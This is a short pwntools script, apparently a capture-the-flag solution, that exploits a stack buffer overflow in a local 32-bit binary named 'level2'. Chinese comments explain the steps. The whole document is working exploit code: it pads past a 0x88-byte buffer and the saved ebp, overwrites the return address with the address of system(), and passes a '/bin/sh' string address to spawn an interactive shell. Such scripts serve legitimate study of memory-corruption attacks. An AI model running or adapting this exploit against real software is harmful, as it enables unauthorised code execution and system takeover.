from pwn import *
a = process('./level2')
##system函数的地址
sysaddr = 0x08048320
##程序中/bin/sh字符串所在的地址
binshaddr = 0x0804A024
# 0x88是程序中缓冲区的大小，4个大小是需要覆盖的ebp的地址，之后是函数的返回地址，被system的地址覆盖了，进入到system函数之后，需要构造system函数的栈帧，因为ebp+8是形参的地址#所以需要四个字节的填充p32(0),后面放的是system里面的参数的地址。这样子溢出之后就会获得shell
payload = b'a'*0x88+b'b'*4+p32(sysaddr)+p32(0)+p32(binshaddr)
a.send(payload)
a.interactive()
